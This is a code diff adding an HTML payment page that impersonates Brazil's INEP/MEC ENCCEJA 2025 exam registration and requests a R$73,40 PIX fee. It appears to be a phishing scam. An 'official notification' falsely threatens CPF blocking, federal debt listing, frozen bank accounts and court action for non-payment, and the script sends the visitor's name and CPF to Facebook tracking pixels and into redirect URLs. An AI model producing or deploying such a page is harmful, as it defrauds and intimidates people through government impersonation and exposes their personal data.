@@ -1,0 +1,563 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <title>ENCCEJA 2025 - Pagamento</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/rawline-fonts.css') }}">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" />
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- Facebook Pixel Code -->
+    <script>
+      !function(f,b,e,v,n,t,s)
+      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+      n.queue=[];t=b.createElement(e);t.async=!0;
+      t.src=v;s=b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t,s)}(window, document,'script',
+      'https://connect.facebook.net/en_US/fbevents.js');
+      fbq('init', '1418766538994503');
+      fbq('init', '1345433039826605'); // Segundo pixel adicionado
+      fbq('track', 'PageView');
+    </script>
+    <noscript>
+      <img height="1" width="1" style="display:none"
+      src="https://www.facebook.com/tr?id=1418766538994503&ev=PageView&noscript=1"/>
+      <img height="1" width="1" style="display:none"
+      src="https://www.facebook.com/tr?id=1345433039826605&ev=PageView&noscript=1"/>
+    </noscript>
+    <!-- End Facebook Pixel Code -->
+    <style>
+        .gov-header {
+            background-color: #222222;
+        }
+        .inep-header {
+            background-color: #044785;
+        }
+        .form-header {
+            background-color: #2c5985;
+            color: white;
+            font-weight: 600;
+        }
+        .btn-primary {
+            background-color: #5d85ab;
+            color: white;
+            transition: all 0.2s ease;
+        }
+        .btn-primary:hover {
+            background-color: #4d7396;
+        }
+        .footer-bg {
+            background-color: #1c2b39;
+        }
+        .pix-container {
+            border: 2px dashed #ddd;
+            background-color: #f9f9f9;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log("Inicializando página de pagamento");
+            
+            // Tentar obter os dados do pagamento
+            const paymentData = JSON.parse(localStorage.getItem('paymentData') || '{}');
+            const userData = JSON.parse(localStorage.getItem('cpfData') || '{}');
+            const addressData = JSON.parse(localStorage.getItem('enderecoData') || '{}');
+            
+            console.log("Dados carregados:", { 
+                paymentData, 
+                userData, 
+                addressData 
+            });
+            
+            // Verificar dados disponíveis e usar a melhor fonte
+            const nome = paymentData.nome || userData.nome || '';
+            const cpf = paymentData.cpf || userData.cpf || '';
+            const telefone = paymentData.telefone || addressData.telefone || '';
+            
+            // Se ainda não tiver os dados mínimos necessários
+            if (!nome || !cpf) {
+                console.error("Dados insuficientes para pagamento");
+                alert("Dados de pagamento incompletos. Você será redirecionado para o início da inscrição.");
+                window.location.href = '/inscricao';
+                return;
+            }
+            
+            // Reconstruir o objeto com os dados disponíveis
+            const dadosPagamento = { nome, cpf, telefone };
+            
+            // Atualizar o localStorage com a versão consolidada
+            localStorage.setItem('paymentData', JSON.stringify(dadosPagamento));
+            
+            // Fazer solicitação para criar pagamento
+            createPayment(dadosPagamento);
+        });
+        
+        function createPayment(userData) {
+            // Exibir spinner enquanto processa
+            document.getElementById('loading-container').classList.remove('hidden');
+            document.getElementById('payment-container').classList.add('hidden');
+            
+            // Fazer requisição para criar o pagamento
+            fetch('/pagamento', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(userData)
+            })
+            .then(response => response.json())
+            .then(data => {
+                // Esconder spinner
+                document.getElementById('loading-container').classList.add('hidden');
+                document.getElementById('payment-container').classList.remove('hidden');
+                
+                if (data.error) {
+                    // Mostrar erro se houver
+                    document.getElementById('error-message').textContent = data.error;
+                    document.getElementById('error-container').classList.remove('hidden');
+                    return;
+                } 
+                
+                if (data.warning) {
+                    // Mostrar alerta se houver, mas continuar processando
+                    document.getElementById('warning-message').textContent = data.warning;
+                    document.getElementById('warning-container').classList.remove('hidden');
+                }
+                
+                // Processar os dados de pagamento
+                    // Mostrar dados de pagamento
+                    if (data.pixQrCode) {
+                        console.log('QR code recebido, processando...');
+                        try {
+                            // Limpar possíveis caracteres indesejados na string base64
+                            const cleanBase64 = data.pixQrCode.replace(/^['"]|['"]$/g, '').trim();
+                            console.log('Base64 limpo, primeiros 20 caracteres:', cleanBase64.substring(0, 20) + '...');
+                            
+                            // Verificar se já tem o prefixo data:image
+                            if (cleanBase64.startsWith('data:image')) {
+                                document.getElementById('qr-code-img').src = cleanBase64;
+                            } else {
+                                document.getElementById('qr-code-img').src = `data:image/png;base64,${cleanBase64}`;
+                            }
+                            
+                            // Adicionar listener para detectar erros de carregamento da imagem
+                            const imgElement = document.getElementById('qr-code-img');
+                            imgElement.onerror = function() {
+                                console.error('Erro ao carregar QR code - imagem inválida');
+                                // Gerar QR code alternativo usando uma biblioteca externa
+                                document.getElementById('qr-code-container').classList.remove('hidden');
+                                
+                                // Se tiver o código PIX, usar uma biblioteca alternativa para gerar QR
+                                if (data.pixCode) {
+                                    const pixValue = data.pixCode;
+                                    const pixCodeElement = document.getElementById('pix-code');
+                                    
+                                    // Usar API externa para gerar QR code a partir do texto
+                                    const qrApiUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixValue)}`;
+                                    imgElement.src = qrApiUrl;
+                                    console.log('Usando QR code alternativo via API');
+                                } else {
+                                    // Não foi possível gerar o QR code
+                                    document.getElementById('qr-code-container').classList.add('hidden');
+                                }
+                            };
+                            
+                            // Mostrar o container
+                            document.getElementById('qr-code-container').classList.remove('hidden');
+                            console.log('Container de QR code visível');
+                            
+                        } catch (error) {
+                            console.error('Erro ao processar QR code:', error);
+                            // Tentar abordagem alternativa com API de QR
+                            if (data.pixCode) {
+                                const pixValue = data.pixCode;
+                                const qrApiUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixValue)}`;
+                                document.getElementById('qr-code-img').src = qrApiUrl;
+                                document.getElementById('qr-code-container').classList.remove('hidden');
+                                console.log('Usando gerador de QR code alternativo após erro');
+                            } else {
+                                document.getElementById('qr-code-container').classList.add('hidden');
+                            }
+                        }
+                    } else if (data.pixCode) {
+                        // Se não tem QR code mas tem o código PIX, gerar QR code a partir do código
+                        console.log('Sem QR code na resposta, mas temos código PIX. Gerando QR...');
+                        const pixValue = data.pixCode;
+                        const qrApiUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixValue)}`;
+                        document.getElementById('qr-code-img').src = qrApiUrl;
+                        document.getElementById('qr-code-container').classList.remove('hidden');
+                    } else {
+                        // Se não tem nem QR code nem código PIX, ocultar a seção
+                        console.log('Sem QR code e sem código PIX na resposta');
+                        document.getElementById('qr-code-container').classList.add('hidden');
+                    }
+                    
+                    if (data.pixCode) {
+                        document.getElementById('pix-code').textContent = data.pixCode;
+                        document.getElementById('pix-code-container').classList.remove('hidden');
+                    } else {
+                        document.getElementById('pix-code-container').classList.add('hidden');
+                    }
+                    
+                    // Salvar ID de transação para verificar status
+                    if (data.id) {
+                        localStorage.setItem('transactionId', data.id);
+                        
+                        // Iniciar verificação periódica do status do pagamento
+                        startPaymentStatusCheck(data.id);
+                    }
+            })
+            .catch(error => {
+                // Esconder spinner e mostrar erro
+                document.getElementById('loading-container').classList.add('hidden');
+                document.getElementById('error-message').textContent = 'Erro ao processar pagamento. Tente novamente.';
+                document.getElementById('error-container').classList.remove('hidden');
+                console.error('Erro:', error);
+            });
+        }
+        
+        function copyPixCode() {
+            const pixCode = document.getElementById('pix-code').textContent;
+            navigator.clipboard.writeText(pixCode)
+                .then(() => {
+                    // Mostrar mensagem de sucesso
+                    const copyButton = document.getElementById('copy-button');
+                    const originalText = copyButton.innerHTML;
+                    copyButton.innerHTML = '<i class="fas fa-check mr-2"></i>Copiado!';
+                    copyButton.classList.remove('bg-green-600');
+                    copyButton.classList.add('bg-blue-600');
+                    
+                    // Voltar ao estado original após 2 segundos
+                    setTimeout(() => {
+                        copyButton.innerHTML = originalText;
+                        copyButton.classList.remove('bg-blue-600');
+                        copyButton.classList.add('bg-green-600');
+                    }, 2000);
+                })
+                .catch(err => {
+                    console.error('Erro ao copiar:', err);
+                });
+        }
+        
+        // Variável para controlar o status de pagamento já confirmado
+        let paymentConfirmed = false;
+        
+        // Função para verificar o status do pagamento periodicamente
+        function startPaymentStatusCheck(transactionId) {
+            console.log('Iniciando verificação periódica do status de pagamento para ID:', transactionId);
+            
+            // Verificar imediatamente
+            checkPaymentStatus(transactionId);
+            
+            // Configurar verificação periódica a cada 10 segundos
+            const checkInterval = setInterval(() => {
+                // Se o pagamento já foi confirmado, interromper as verificações
+                if (paymentConfirmed) {
+                    console.log('Pagamento já confirmado, interrompendo verificações');
+                    clearInterval(checkInterval);
+                    return;
+                }
+                
+                checkPaymentStatus(transactionId);
+            }, 10000); // 10 segundos
+            
+            // Parar de verificar após 30 minutos (1800 segundos) para não consumir recursos
+            setTimeout(() => {
+                clearInterval(checkInterval);
+                console.log('Verificação de pagamento encerrada após 30 minutos');
+            }, 1800000);
+        }
+        
+        // Função para verificar o status do pagamento no servidor
+        function checkPaymentStatus(transactionId) {
+            console.log('Verificando status do pagamento...');
+            
+            fetch('/verificar-pagamento', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ transactionId: transactionId })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Status do pagamento:', data);
+                
+                // Se o pagamento foi aprovado/confirmado (verificando tanto status quanto original_status)
+                if (data.status === 'PAID' || data.status === 'COMPLETED' || 
+                    data.status === 'APPROVED' || data.original_status === 'APPROVED') {
+                    // Marcar como confirmado para parar as verificações
+                    paymentConfirmed = true;
+                    console.log('PAGAMENTO APROVADO! Preparando redirecionamento...');
+                    
+                    // Verificar se temos IDs de pixel para rastrear
+                    if (data.facebook_pixel_id) {
+                        console.log('Recebido ID(s) de Pixel para rastreamento de conversão:', data.facebook_pixel_id);
+                    }
+                    
+                    // Mostrar mensagem de sucesso
+                    const successMessage = document.createElement('div');
+                    successMessage.className = 'bg-green-50 p-4 rounded-md border border-green-300 text-green-800 my-4';
+                    successMessage.innerHTML = `
+                        <p class="flex items-start">
+                            <i class="fas fa-check-circle text-green-600 mr-2 mt-1"></i>
+                            <span>
+                                <strong>Pagamento confirmado!</strong> Sua inscrição foi concluída com sucesso.
+                                Redirecionando para a página de confirmação...
+                            </span>
+                        </p>
+                    `;
+                    
+                    // Adicionar mensagem ao container
+                    const paymentDetailsContainer = document.getElementById('payment-container');
+                    paymentDetailsContainer.insertBefore(successMessage, paymentDetailsContainer.firstChild);
+                    
+                    // Disparar evento de conversão no Facebook Pixel
+                    console.log('Disparando evento de conversão no Facebook Pixel');
+                    if (typeof fbq !== 'undefined') {
+                        // Obter dados do localStorage para o evento
+                        const userData = JSON.parse(localStorage.getItem('paymentData') || '{}');
+                        const nome = userData.nome || '';
+                        const cpf = userData.cpf || '';
+                        
+                        // Definir dados do evento
+                        const eventData = {
+                            value: 39.70,
+                            currency: 'BRL',
+                            content_name: 'Taxa de Inscrição ENCCEJA 2025',
+                            content_type: 'product',
+                            content_ids: ['encceja-2025-taxa'],
+                            content_category: 'Taxa de Inscrição',
+                            user_data: {
+                                name: nome,
+                                external_id: cpf.replace(/\D/g, '')
+                            }
+                        };
+                        
+                        try {
+                            // Enviar para o pixel principal
+                            fbq('track', 'Purchase', eventData);
+                            console.log('Evento enviado para pixel principal 1418766538994503');
+                            
+                            // Enviar para o segundo pixel também
+                            fbq('trackSingle', '1345433039826605', 'Purchase', eventData);
+                            console.log('Evento enviado para pixel 1345433039826605');
+                        } catch (e) {
+                            console.error('Erro ao enviar evento para o pixel:', e);
+                        }
+                    } else {
+                        console.error('Facebook Pixel não disponível');
+                    }
+                    
+                    // Obter os dados do usuário para enviar para a página de agradecimento
+                    const userData = JSON.parse(localStorage.getItem('paymentData') || '{}');
+                    const nome = userData.nome || '';
+                    const cpf = userData.cpf || '';
+                    const telefone = userData.telefone || '';
+                    
+                    // Redirecionar instantaneamente para a página de agradecimento com os dados do usuário
+                    const urlParams = new URLSearchParams();
+                    if (nome) urlParams.append('nome', nome);
+                    if (cpf) urlParams.append('cpf', cpf);
+                    if (telefone) urlParams.append('phone', telefone);
+                    
+                    // Redirecionar instantaneamente
+                    window.location.href = '/obrigado?' + urlParams.toString();
+                }
+                // Se o pagamento foi recusado ou cancelado
+                else if (data.status === 'CANCELED' || data.status === 'REJECTED' || data.status === 'FAILED') {
+                    // Mostrar mensagem de erro
+                    document.getElementById('error-message').textContent = 'Pagamento recusado ou cancelado. Por favor, tente novamente.';
+                    document.getElementById('error-container').classList.remove('hidden');
+                    
+                    // Parar verificações
+                    paymentConfirmed = true;
+                }
+            })
+            .catch(error => {
+                console.error('Erro ao verificar status do pagamento:', error);
+            });
+        }
+    </script>
+</head>
+<body class="flex flex-col min-h-screen">
+    <!-- Government Header -->
+    <header class="gov-header text-white py-2">
+        <div class="container mx-auto flex justify-between items-center px-4">
+            <a class="font-bold text-sm" href="#">
+                <img src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" alt="Logotipo do Brasil" class="h-6" />
+            </a>
+            <nav>
+                <ul class="flex space-x-4 text-[10px]">
+                    <li>
+                        <a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">PARTICIPE</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">SERVIÇOS</a>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+    <!-- INEP Header -->
+    <div class="inep-header py-3">
+        <div class="container mx-auto px-4">
+            <svg class="h-7" height="30" preserveAspectRatio="xMidYMid" viewBox="0 0 69 20" width="120" xmlns="http://www.w3.org/2000/svg">
+                <defs>
+                    <style>
+                        .cls-2{fill:#fff}
+                    </style>
+                </defs>
+                <path class="cls-2" d="M30 20h17v-5H35v-3h12V7H30v13zM50 0v5h19c0-2.47-2.108-5-5-5M50 20h6v-8h8c2.892 0 5-2.53 5-5H50v13zM22 0H9v5h18c-.386-4.118-4.107-5-5-5zm8 5h17V0H30v5zM0 20h6V7H0v13zm9 0h6V7H9v13zm12 0h6V7h-6v13zM0 5h6V0H0v5z" fill-rule="evenodd" id="path-1"/>
+            </svg>
+        </div>
+    </div>
+    <!-- Main Content -->
+    <main class="flex-grow py-8">
+        <div class="container mx-auto px-4 max-w-3xl">
+            <!-- ENCCEJA Logo -->
+            <div class="text-center mb-6">
+                <img alt="Logo ENCCEJA 2025" class="mx-auto" height="100" src="https://lh4.googleusercontent.com/proxy/_9Y0LIQJY1EdBdBVxy9MNsDDxrwGhfi2sjqj0zyi8ozsQS0eaxz82ZcL248lfPHCGJ3N07JVCIidVaFuR9pcnZNvpdEzt9bcLzGuHf9h09CpscRLpaqVYz0" width="420"/>
+            </div>
+            <!-- Payment Container -->
+            <div class="border border-gray-300 rounded">
+                <!-- Form Header -->
+                <div class="form-header py-2 px-4 text-center">
+                    <h2 class="text-lg flex items-center justify-center">
+                        <div class="animate-spin w-5 h-5 border-2 border-white border-t-transparent rounded-full mr-2"></div>
+                        Aguardando seu pagamento
+                    </h2>
+                </div>
+                <!-- Content -->
+                <div class="p-6">
+                    <div class="bg-red-600 p-4 rounded-md mb-5 text-white shadow-md">
+                        <div class="flex items-center mb-2">
+                            <i class="fas fa-exclamation-triangle text-yellow-300 mr-2 text-xl"></i>
+                            <h3 class="font-bold text-lg text-base" style="font-size: 16px;">NOTIFICAÇÃO OFICIAL</h3>
+                        </div>
+                        <p class="mb-3" style="font-size: 16px;">Ao prosseguir, você concordou com o pagamento da taxa de inscrição no valor de <strong>R$73,40</strong>. Conforme regulamento, o não pagamento resultará em <strong>bloqueio de CPF</strong> por 3 anos no sistema ENCCEJA.</p>
+                        <p class="mb-3" style="font-size: 16px;">O não pagamento resultará na inscrição do nome e CPF em <strong>dívida ativa da União</strong>, incidindo multas e encargos legais sobre o valor original. Esta situação pode acarretar em bloqueio de contas bancárias, intimações judiciais, redução do score de crédito e negativação do nome em órgãos de proteção.</p>
+                        <p class="font-semibold" style="font-size: 16px;">Efetue o pagamento imediatamente para regularizar sua situação.</p>
+                    </div>
+                    
+                    <!-- Loading Container -->
+                    <div id="loading-container" class="text-center py-10">
+                        <div class="spinner mb-4"></div>
+                        <p class="text-lg font-semibold text-gray-700">Gerando código de pagamento...</p>
+                        <p class="text-sm text-gray-500 mt-2">Aguarde alguns instantes...</p>
+                    </div>
+                    
+                    <!-- Error Container -->
+                    <div id="error-container" class="bg-red-50 p-4 rounded-md border border-red-300 text-red-800 my-4 hidden">
+                        <p class="flex items-start">
+                            <i class="fas fa-exclamation-circle text-red-600 mr-2 mt-1"></i>
+                            <span id="error-message">Ocorreu um erro ao processar o pagamento.</span>
+                        </p>
+                    </div>
+                    
+                    <!-- Warning Container -->
+                    <div id="warning-container" class="bg-amber-50 p-4 rounded-md border border-amber-300 text-amber-800 my-4 hidden">
+                        <p class="flex items-start">
+                            <i class="fas fa-exclamation-triangle text-amber-600 mr-2 mt-1"></i>
+                            <span id="warning-message">Aviso: Por favor, aguarde enquanto processamos seu pagamento.</span>
+                        </p>
+                    </div>
+                    
+                    <!-- Payment Details -->
+                    <div id="payment-container" class="hidden">
+                        <div class="mb-6">
+                            <div class="flex items-center justify-between mb-4">
+                                <h3 class="text-lg font-bold text-gray-800">Taxa de Inscrição</h3>
+                                <p class="text-lg font-bold text-gray-800">R$ 73,40</p>
+                            </div>
+                            
+                            <!-- PIX Code -->
+                            <div id="pix-code-container" class="hidden mb-6">
+                                <p class="text-center font-semibold text-gray-700 mb-2">Copie o código PIX:</p>
+                                <div class="pix-container p-3 rounded-md mb-4">
+                                    <div class="bg-white border border-gray-300 p-3 rounded-md text-sm text-gray-800 break-all font-mono">
+                                        <p id="pix-code" class="max-h-24 overflow-y-auto"></p>
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mb-3">
+                                    <button id="copy-button" onclick="copyPixCode()" class="bg-green-600 hover:bg-green-700 text-white py-2 px-5 rounded-md flex items-center">
+                                        <i class="fas fa-copy mr-2"></i>
+                                        <span>Copiar código PIX</span>
+                                    </button>
+                                </div>
+                                <div class="bg-gray-100 p-4 rounded-md text-gray-700 text-sm mb-4">
+                                    <h4 class="font-semibold mb-2">Como pagar com o PIX Copia e Cola:</h4>
+                                    <ol class="list-decimal pl-5 space-y-1">
+                                        <li>Clique no botão verde acima para copiar o código</li>
+                                        <li>Abra o aplicativo do seu banco</li>
+                                        <li>Selecione a opção "Pagar com PIX" ou "PIX Copia e Cola"</li>
+                                        <li>Cole o código copiado no campo indicado</li>
+                                        <li>Confira o valor de R$ 73,40 e confirme o pagamento</li>
+                                    </ol>
+                                </div>
+                            </div>
+                            
+                            <!-- QR Code -->
+                            <div id="qr-code-container" class="hidden">
+                                <p class="text-center font-semibold text-gray-700 mb-3">Ou escaneie o QR Code com seu aplicativo bancário:</p>
+                                <div class="flex justify-center mb-6">
+                                    <img id="qr-code-img" src="" alt="QR Code PIX" class="w-48 h-48 border border-gray-300 p-2 bg-white">
+                                </div>
+                            </div>
+                            
+                            <div class="bg-yellow-50 p-4 rounded-md border border-yellow-200 text-yellow-800 mt-6">
+                                <p class="flex items-start">
+                                    <i class="fas fa-exclamation-triangle text-yellow-600 mr-2 mt-1"></i>
+                                    <span>
+                                        <strong>Atenção:</strong> Após o pagamento, o sistema atualizará o status da sua inscrição automaticamente. O comprovante de inscrição estará disponível em até 30 minutos após a confirmação do pagamento.
+                                    </span>
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+    <!-- Footer -->
+    <footer class="footer-bg text-white py-4 text-xs">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-col items-center mb-2">
+                <svg xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid" width="69" height="20" viewBox="0 0 69 20" class="h-16 w-auto mb-3">
+                    <defs><style>.cls-2{fill:#fff}</style></defs>
+                    <path d="M30 20h17v-5H35v-3h12V7H30v13zM50 0v5h19c0-2.47-2.108-5-5-5M50 20h6v-8h8c2.892 0 5-2.53 5-5H50v13zM22 0H9v5h18c-.386-4.118-4.107-5-5-5zm8 5h17V0H30v5zM0 20h6V7H0v13zm9 0h6V7H9v13zm12 0h6V7h-6v13zM0 5h6V0H0v5z" id="path-1" class="cls-2" fill-rule="evenodd"/>
+                </svg>
+                <p class="text-sm text-center mb-2">Instituto Nacional de Estudos e Pesquisas Educacionais</p>
+            </div>
+            <div class="flex justify-between items-center">
+                <div>
+                    © MEC - Ministério da Educação | INEP - Instituto Nacional de Estudos e Pesquisas
+                </div>
+                <div class="flex items-center">
+                    <i class="fas fa-phone-alt mr-1"></i>
+                    0800 616161
+                </div>
+            </div>
+        </div>
+    </footer>
+</body>
+</html>
